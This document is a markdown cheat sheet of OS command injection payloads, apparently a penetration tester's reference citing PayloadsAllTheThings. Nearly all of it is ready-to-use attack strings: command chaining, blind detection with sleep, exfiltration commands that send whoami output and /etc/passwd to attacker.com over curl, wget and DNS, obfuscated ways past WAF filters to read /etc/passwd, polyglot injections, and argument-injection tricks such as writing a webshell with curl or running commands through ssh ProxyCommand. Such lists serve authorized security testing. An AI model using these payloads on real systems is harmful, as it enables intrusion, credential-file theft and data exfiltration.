# Command Injection

## Chaining Operators
```
;    command1; command2        # sequential
&&   command1 && command2      # AND (second runs if first succeeds)
||   command1 || command2      # OR (second runs if first fails)
|    command1 | command2       # pipe stdout
&    command1 & command2        # background
`    `command`                  # backtick substitution
$()  $(command)                 # POSIX substitution
```
## Detection
```
; sleep 5
| sleep 5
&& sleep 5
|| sleep 5
`sleep 5`
$(sleep 5)
& ping -c 5 127.0.0.1 &
```
## Data Exfiltration
```
; curl http://attacker.com/$(whoami)
| nslookup $(whoami).attacker.com
; wget --post-file=/etc/passwd http://attacker.com/
; dig +short $(hostname).attacker.com TXT
; for i in $(ls /); do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```
## WAF Bypass Techniques
### No-Space Bypass
```
cat${IFS}/etc/passwd          # IFS as space
{cat,/etc/passwd}              # brace expansion
cat</etc/passwd                # input redirect
ls%09-la%09/home               # tab (%09)
{X=cat,/etc/passwd};$X
```
### No-Slash Bypass
```
cat ${HOME:0:1}etc${HOME:0:1}passwd         # env var slice
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat $(echo . | tr '!-0' '"-1')etc/$(echo . | tr '!-0' '"-1')passwd
xxd -r -p <<< 2f6574632f706173737764
```
### Quote Insertion
```
w'h'o'am'i                    # single quotes
w"h"o"am"i                    # double quotes
wh``oami                      # backticks inside
w\ho\am\i                     # backslash
/\b\i\n/////s\h              # random slashes
```
### Variable Expansion
```
who$@ami                      # $@ expands to nothing
who$()ami                     # $() expands to nothing
who$(echo am)i                # subshell
test=/ehhh/hmtc/pahhh/hmsswd; cat ${test//hhh\/hm/}
/???/??t /???/p??s??          # wildcard globbing
```
### Hex Encoding
```
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" | xargs cat
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'; cat $abc
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
```
### Case Obfuscation (Windows)
```
wHoAmi                        # Windows is case-insensitive
WhOaMi
```
### Backslash-Newline
```
cat /et\
c/pa\
sswd
```
### Polyglot Injection
```
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```
### Argument Injection
```
# curl — write webshell via -o
curl http://attacker.com/ -o webshell.php

# SSH — exec via ProxyCommand
ssh '-oProxyCommand="touch /tmp/pwned"' foo@foo

# Chrome — exec via --gpu-launcher
chrome '--gpu-launcher="id>/tmp/foo"'

# psql
psql -o'|id>/tmp/foo'
```
### WorstFit (Windows ANSI Fullwidth Quotes)
```
# Using U+FF02 fullwidth double quotes instead of U+0022
$url = "https://target/" + $_GET['path'] + ".txt";
system("wget.exe -q " . escapeshellarg($url));
# Payload: ＂ --use-askpass=calc ＂
```
### Remove Trailing Arguments
```
--   # double-dash ends option parsing
;id --
;id #
;id //
```
### Background Long-Running Commands
```
nohup sleep 120 > /dev/null &
```
## References
- [PayloadsAllTheThings CMDi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [PortSwigger OS Command Injection](https://portswigger.net/web-security/os-command-injection)
- [Argument Injection Vectors](https://sonarsource.github.io/argument-injection-vectors/)
